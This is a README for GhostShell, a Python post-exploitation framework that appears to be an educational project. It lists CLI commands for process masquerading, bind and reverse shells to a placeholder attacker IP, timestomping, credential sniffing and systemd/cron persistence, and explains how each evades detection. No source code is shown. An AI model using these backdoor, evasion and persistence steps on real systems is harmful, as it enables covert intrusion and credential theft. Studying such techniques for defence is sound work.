# 👻 GhostShell

## Executive Summary

GhostShell is a Post-Exploitation and Operating System Manipulation framework designed for Linux environments (run via Docker). Its purpose is to provide a practical demonstration of concepts such as **Defense Evasion**, **Persistence**, and **Low-level Networking**.

The application acts as a "Swiss Army Knife" for an Ethical Hacker who has already gained access to a machine and wishes to remain undetected while performing sensitive operations.

## 🧩 Core Modules (CLI Commands)

### 1. Evasion Module (ghost)
**Command:** `python main.py ghost --name "nginx-worker"`

*   **Function:** Activates the Process Masquerading technique.
*   **Mechanism:** It doesn't just change the window title; it directly accesses the process memory and overwrites the command-line arguments (`argv`).
*   **Result:** Deceives standard monitoring tools (`ps`, `top`, `htop`). An administrator will see a legitimate process (e.g., nginx) instead of a suspicious Python script.

### 2. Reconnaissance Module (scan)
**Command:** `python main.py scan 192.168.1.5 --ports 1-1000`

*   **Function:** Scans for open ports on a remote target.
*   **Mechanism:** Uses TCP Sockets (`SOCK_STREAM`) and Multi-threading to verify hundreds of ports simultaneously by analyzing the "Three-Way Handshake" response.
*   **Result:** Identifies vulnerable services on the network without installing noisy external tools like nmap.

### 3. Bind Shell Module (listen)
**Command:** `python main.py listen --port 4444`

*   **Function:** Opens a "Backdoor" on the victim's system.
*   **Mechanism:** Creates a server socket listening on `0.0.0.0`. Any incoming connection is granted access to the command line (shell).
*   **Limitation:** Easily detectable and blocked by firewalls that do not allow inbound connections (Inbound Rules).

### 4. Reverse Shell Module (connect)
**Command:** `python main.py connect <ATTACKER_IP> --port 4444`

*   **Function:** Initiates a connection FROM the victim TO the attacker.
*   **Mechanism:** Simulates a web client (e.g., browser) accessing the internet. Once connected, the attacker sends commands through this tunnel.
*   **Strategic Advantage:** Bypasses most corporate/lab firewalls because outbound traffic is usually permitted.

### 5. Audit Module (audit)
**Command:** `python main.py audit`

*   **Function:** Performs a quick check of the kernel's security status.
*   **Mechanism:** Compares the current kernel version (`uname -r`) against a database of critical vulnerabilities (e.g., Dirty Pipe - CVE-2022-0847).

### 6. Timestomping Module (timestomp)
**Command:** `python main.py timestomp my_script.py --ref_file "/bin/bash"`

*   **Function:** Modifies a file's metadata to match a legitimate system file.
*   **Mechanism:** Reads the inode information (`st_atime`, `st_mtime`) from a reference file and applies it to the target using `os.utime`.
*   **Result:** The file appears to have been created/modified years ago (e.g., 2018), helping it evade forensic analysis based on timeline sorting.

### 7. Sniffer Module (sniff)
**Command:** `python main.py sniff --interface eth0`

*   **Function:** Intercepts network traffic in real-time.
*   **Mechanism:** Uses **Raw Sockets** (`AF_PACKET`) to bypass the OS network stack and capture Ethernet frames directly from the driver. It decodes TCP/IP headers manually.
*   **Result:** Can capture cleartext credentials (FTP, Telnet, HTTP) if an administrator logs in while the sniffer is running.

### 8. Persistence Module (persist)
**Command:** `python main.py persist --method systemd`

*   **Function:** Ensures GhostShell starts automatically after a reboot.
*   **Mechanism:** Creates a systemd service or adds a cron job (`@reboot`).
*   **Result:** Maintains access even if the victim restarts the machine.

### 9. Interactive Mode (menu)
**Command:** `python main.py` (or `python main.py menu`)

*   **Function:** Launches a TUI (Text User Interface) Dashboard.
*   **Mechanism:** Uses `rich` and `typer` to provide a navigational menu.
*   **Result:** Allows using all modules without memorizing long CLI arguments.

---

## 🛠️ Installation & Setup

The project is fully containerized. Whether you are on Windows, macOS, or Linux, the steps are identical.

### Prerequisites

*   ✅ Docker Desktop installed and running
*   ✅ Git (optional, for cloning)

### Step 1: Clone the Repository

```bash
git clone https://github.com/MariusZmr/GhostShell.git
cd GhostShell-Proiect-SO
```

### Step 2: Start the Environment (Docker)

This command will build the image and install all dependencies in isolation.

```bash
docker-compose up -d --build
```

### Step 3: Access the Shell

All commands are executed inside the container.

```bash
docker-compose exec ghostshell bash
```

> Your prompt should now be: `root@docker-desktop:/app#`

---

## 🏗️ Technical Architecture

| Component | Details |
|---|---|
| **Language** | Python 3.10 |
| **CLI Framework** | Typer + Rich (for colored UI and tables) |
| **OS Manipulation** | `setproctitle` (C extension for Python) for argv access |
| **Infrastructure** | Docker (Debian Slim image) |

---

## ⚖️ Disclaimer

This software was created **strictly for educational purposes**. The author is not responsible for any misuse of this utility.